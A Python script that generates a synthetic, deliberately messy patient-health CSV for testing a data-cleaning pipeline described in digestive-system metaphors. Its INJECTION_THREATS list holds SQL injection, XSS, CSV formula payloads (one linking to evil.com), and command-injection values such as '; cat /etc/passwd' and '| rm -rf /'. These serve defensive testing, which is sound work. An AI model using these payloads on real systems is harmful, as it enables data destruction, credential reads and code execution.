"""
Script to generate a concise, comprehensive dataset with exactly 200 records.
Covers all edge cases, dirty formatting, stomach acid triggers, liver detox triggers,
immune injection threats, quarantine violations, and deduplication.
"""
import random
import csv
import os

FIRST_NAMES = ["John", "Jane", "Alice", "Bob", "Mary", "Michael", "David", "Sarah", "James", "Emma"]
LAST_NAMES = ["Doe", "Johnson", "Smith", "Williams", "Brown", "Jones", "Miller", "Davis"]

GENDERS = ["MALE", "FEMALE", "male", "female", "M", "F", "m", "f", ""]
AGES = ["25", "30", "35", "40", "45", "50", "55", "65", "forty", "fifty", "sixty", ""]
HEIGHTS = ["160", "165", "170", "175", "180", "170cm", "165cm", "one seventy", ""]
WEIGHTS = ["60", "65", "70", "75", "80", "85", "90", "eighty", ""]
BLOOD_PRESSURES = ["120/80", "140/90", "110 over 70", "130-85", "90 by 70", "125 over 82", ""]
DIABETES_VALS = ["Yes", "No", "YES", "nO", "Y", "N", ""]
SMOKER_VALS = ["No", "Yes", "NO", "nO", "Occasionally", "occasionally", ""]
DATES = ["2023.04.01", "15-02-2023", "2023/01/15", "March 5 2023", "2023-07-20", ""]
DIAGNOSES = ["Hypertension", "Diabetes Type II", "Asthma", "none", "Cardiovascular Disease", ""]

# Security Injection Threat Payloads (Immune system triggers)
INJECTION_THREATS = [
    ("Name", "Robert'; DROP TABLE Patients;--"),
    ("Name", "<script>alert('XSS')</script>"),
    ("Name", "=cmd|' /C calc'!A0"),
    ("Patient ID", "PID9999' UNION SELECT * FROM users--"),
    ("Blood Pressure", "120/80; cat /etc/passwd"),
    ("Diagnosis", "Hypertension'; DROP TABLE Diagnoses;--"),
    ("Name", "<img src=x onerror=alert(1)>"),
    ("Date of Visit", "2023-01-01 && whoami"),
    ("Name", "=HYPERLINK(\"http://evil.com/leak\")"),
    ("Patient ID", "PID8888' OR '1'='1"),
    ("Name", "Admin'; xp_cmdshell('dir');--"),
    ("Smoker", "Yes | rm -rf /")
]

# Corrupted Characters / Control Characters (Stomach Acid triggers)
DIRTY_SYMBOLS = [
    "\x00",            # Null byte
    "\x07\x08",        # Bell / backspace control chars
    "\ufeff",          # Byte order mark
    "\u200b\u200c",    # Zero-width spaces
    "\x01\x02\x03",    # SOH / STX / ETX non-printable control chars
    "\x1b[2J",         # ANSI escape sequences
    "\x0c"             # Form feed
]


def generate_short_dataset(num_rows: int = 200, output_filename: str = "short_messy_health_data.csv"):
    header = [
        "Patient ID", "Name", "Gender", "Age", "Height_cm", "Weight_kg",
        "BMI", "Blood Pressure", "Diabetes", "Smoker", "Date of Visit", "Diagnosis"
    ]

    rows = []
    pid_counter = 1000

    # Ensure a fixed quota of specific test scenarios within the 200 rows:
    # - 15 Injection threats
    # - 15 Missing high-priority (Quarantine) records
    # - 35 Acid-dissolution dirty records
    # - 10 Duplicate records
    # - Remaining (~125) varied dirty records that liver cleans and small intestine absorbs

    # Pre-plan row indices for specific tests
    indices = list(range(num_rows))
    random.seed(42)  # Deterministic reproducibility
    random.shuffle(indices)

    threat_indices = set(indices[:15])
    quarantine_indices = set(indices[15:30])
    acid_indices = set(indices[30:70])
    duplicate_indices = set(indices[70:80])

    threat_iter = iter(INJECTION_THREATS * 2)

    for i in range(num_rows):
        pid_counter += 1
        pid = f"PID{pid_counter}"

        fn = random.choice(FIRST_NAMES)
        ln = random.choice(LAST_NAMES)
        
        # Inconsistent casing
        c_mode = i % 4
        if c_mode == 0:
            name = f"{fn} {ln}".upper()
        elif c_mode == 1:
            name = f"{fn.lower()} {ln.lower()}"
        elif c_mode == 2:
            name = f"{fn.lower()}{ln.lower()}"
        else:
            name = f"{fn} {ln}"

        gender = GENDERS[i % len(GENDERS)]
        age = AGES[i % len(AGES)]
        height = HEIGHTS[i % len(HEIGHTS)]
        weight = WEIGHTS[i % len(WEIGHTS)]
        bp = BLOOD_PRESSURES[i % len(BLOOD_PRESSURES)]
        diabetes = DIABETES_VALS[i % len(DIABETES_VALS)]
        smoker = SMOKER_VALS[i % len(SMOKER_VALS)]
        date_visit = DATES[i % len(DATES)]
        diag = DIAGNOSES[i % len(DIAGNOSES)]

        row_dict = {
            "Patient ID": pid,
            "Name": name,
            "Gender": gender,
            "Age": age,
            "Height_cm": height,
            "Weight_kg": weight,
            "BMI": "",
            "Blood Pressure": bp,
            "Diabetes": diabetes,
            "Smoker": smoker,
            "Date of Visit": date_visit,
            "Diagnosis": diag
        }

        # 1. Acid dissolution triggers
        if i in acid_indices:
            dirty_sym = DIRTY_SYMBOLS[i % len(DIRTY_SYMBOLS)]
            target_field = random.choice(["Name", "Height_cm", "Weight_kg", "Diagnosis", "Blood Pressure"])
            row_dict[target_field] = f"{dirty_sym}{row_dict[target_field]}{dirty_sym}"

        # 2. Injection threats
        if i in threat_indices:
            t_field, t_payload = next(threat_iter)
            row_dict[t_field] = t_payload

        # 3. Missing high-priority violations (Quarantine triggers)
        if i in quarantine_indices:
            if i % 2 == 0:
                row_dict["Name"] = ""
            else:
                row_dict["Patient ID"] = ""

        rows.append(row_dict)

    # 4. Inject duplicates
    for dup_idx in duplicate_indices:
        src_idx = max(0, dup_idx - 5)
        rows[dup_idx] = dict(rows[src_idx])

    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_filename)
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=header)
        writer.writeheader()
        for r in rows:
            writer.writerow(r)

    size_kb = os.path.getsize(output_path) / 1024.0
    print(f"Successfully generated short dataset with {len(rows)} records at: {output_path}")
    print(f"File size: {size_kb:.2f} KB (Target boluses: ~{int(round(size_kb))})")


if __name__ == "__main__":
    generate_short_dataset(num_rows=200, output_filename="short_messy_health_data.csv")

